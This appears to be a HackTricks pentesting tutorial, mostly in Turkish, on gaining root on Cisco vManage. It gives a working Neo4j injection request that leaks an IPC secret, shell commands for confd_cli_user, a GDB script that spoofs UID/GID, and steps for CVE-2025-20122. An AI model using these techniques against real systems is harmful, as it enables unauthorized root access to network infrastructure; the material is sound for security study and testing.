# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

## Yol 1

(Örnek: [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Biraz `confd` ve farklı ikili dosyalarla ilgili bazı [dokümantasyonları](http://66.218.245.39/doc/html/rn03re18.html) (Cisco web sitesinde bir hesapla erişilebilir) inceledikten sonra, IPC soketini doğrulamak için `/etc/confd/confd_ipc_secret` konumunda bir gizli anahtar kullandığını bulduk:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Neo4j instance'ımızı hatırlıyor musunuz? `vmanage` kullanıcısının ayrıcalıkları altında çalışıyor, bu da önceki vulnerability'yi kullanarak dosyayı almamıza olanak sağlıyor:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` programı komut satırı argümanlarını desteklemiyor fakat argümanlarla `/usr/bin/confd_cli_user`'ı çağırıyor. Bu yüzden kendi argümanlarımızla doğrudan `/usr/bin/confd_cli_user`'ı çağırabiliriz. Ancak şu anki ayrıcalıklarımızla okunamıyor; bu yüzden onu rootfs'ten alıp scp ile kopyalamalı, help'ini okumalı ve shell elde etmek için kullanmalıyız:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Yol 2

(Örnek: [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

synacktiv ekibinin blog¹'ü root shell elde etmek için zarif bir yol anlatıyordu, fakat sıkıntı şu ki bu, sadece root tarafından okunabilen `/usr/bin/confd_cli_user` dosyasının bir kopyasını almayı gerektiriyor. Ben böyle zahmete girmeden root'a yükselmenin başka bir yolunu buldum.

`/usr/bin/confd_cli` ikili dosyasını ayırıp incelediğimde aşağıdakileri gözlemledim:

<details>
<summary>Objdump showing UID/GID collection</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

“ps aux” komutunu çalıştırdığımda, aşağıdakileri gözlemledim (_note -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Varsaydım ki “confd_cli” programı, oturum açmış kullanıcıdan topladığı kullanıcı kimliği (UID) ve grup kimliğini (GID) “cmdptywrapper” uygulamasına geçiriyor.

İlk denememde “cmdptywrapper”'ı doğrudan çalıştırıp `-g 0 -u 0` ile beslemeyi denedim, ancak başarısız oldu. Görünüşe göre bir dosya tanımlayıcısı (-i 1015) bir yerde oluşturulmuş ve bunu taklit edemiyorum.

synacktiv’s blog(last example)'de bahsedildiği gibi, `confd_cli` programı komut satırı argümanlarını desteklemiyor, ancak bir debugger ile onu etkileyebiliyorum ve neyse ki sistemde GDB yüklü.

getuid ve getgid API'lerini 0 döndürecek şekilde zorladığım bir GDB scripti oluşturdum. Zaten deserialization RCE ile “vmanage” ayrıcalığına sahip olduğum için `/etc/confd/confd_ipc_secret` dosyasını doğrudan okuma iznim var.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Konsol Çıktısı:

<details>
<summary>Konsol Çıktısı</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug)

Cisco, vManage'i *Catalyst SD-WAN Manager* olarak yeniden adlandırdı, ancak alttaki CLI aynı kutuda çalışmaya devam ediyor. 2025 tarihli bir advisory (CVE-2025-20122), CLI'deki yetersiz input validation'ın **herhangi bir kimliği doğrulanmış yerel kullanıcıya** manager CLI servisine hazırlanmış bir istek göndererek root elde etme imkanı verdiğini açıklıyor. Herhangi bir düşük ayrıcalıklı foothold ile (ör. Path1'deki Neo4j deserialization veya bir cron/backup kullanıcı shell'i) bu hatayı birleştirerek `confd_cli_user`'ı kopyalamaya veya GDB bağlamaya gerek kalmadan root'a atlayabilirsiniz:

1. Düşük ayrıcalıklı shell'inizi kullanarak CLI IPC endpoint'ini bulun (genellikle Path2'de görülen ve port 4565'te dinleyen `cmdptywrapper` listener).
2. UID/GID alanlarını 0 olarak sahteleştiren bir CLI isteği oluşturun. Validation bug, orijinal çağıranın UID'sini zorunlu kılmıyor, bu yüzden wrapper root yetkili bir PTY başlatıyor.
3. Root shell elde etmek için herhangi bir komut dizisini (`vshell; id`) sahtelenmiş istek üzerinden pipe edin.

> Exploit yüzeyi sadece local; initial shell'i elde etmek için hâlâ remote code execution gerekiyor, ancak kutunun içine girdikten sonra exploitation, debugger-based UID patch yerine tek bir IPC mesajıyla gerçekleşiyor.

## Diğer yakın tarihli vManage/Catalyst SD-WAN Manager zincirlenebilecek zafiyetler

* **Authenticated UI XSS (CVE-2024-20475)** – Belirli arayüz alanlarına JavaScript enjekte edin; bir admin oturumunu çalmak, size tarayıcı kaynaklı bir yol sağlar: `vshell` → yerel shell → Path3 ile root.

## References

- [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-priviesc-WCk7bmmt.html)
- [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-xss-zQ4KPvYd.html)

{{#include ../../banners/hacktricks-training.md}}
